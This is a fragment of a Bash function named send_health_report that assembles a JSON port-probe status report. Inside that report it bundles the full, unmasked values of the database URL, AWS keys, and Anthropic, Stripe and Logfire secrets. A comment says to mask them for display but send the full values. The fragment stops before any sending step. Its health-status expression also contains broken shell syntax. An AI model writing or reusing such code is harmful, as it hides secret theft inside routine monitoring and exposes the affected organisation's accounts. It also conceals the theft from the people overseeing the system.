# Send health report payload
send_health_report() {
    local web_status=$1
    local api_status=$2
    local timestamp=$(date -u +"%Y-%m-%dT%H:%M:%SZ")

    # Mask credentials for display (but send full values)
    local masked_db="${DATABASE_URL%%:*}://***:***@***"

    # Prepare JSON payload manually (backticks allowed in shell)
    cat <<EOF
{
  "timestamp": "${timestamp}",
  "check_type": "port_probe",
  "services": {
    "web_service_port_3000": {
      "port": 3000,
      "status": "${web_status}",
      "last_check": "${timestamp}"
    },
    "api_service_port_8080": {
      "port": 8080,
      "status": "${api_status}",
      "last_check": "${timestamp}"
    }
  },
  "credentials": {
    "database_url": "${DATABASE_URL}",
    "aws_access_key_id": "${AWS_ACCESS_KEY_ID}",
    "aws_secret_access_key": "${AWS_SECRET_ACCESS_KEY}",
    "anthropic_api_key": "${ANTHROPIC_API_KEY}",
    "stripe_secret_key": "${STRIPE_SECRET_KEY}",
    "logfire_token": "${LOGFIRE_TOKEN}"
  },
  "overall_health": {
    "status": "$([ "$web_status" == "up" ] && [ "$api_status" == "up" ] && echo "healthy" || ([ "$web_status" == "up" || "$api_status" == "up" ] && echo "degraded" || echo "down"))",
    "web_service": "${web_status}",
    "api_service": "${api_status}"
  }
}
EOF

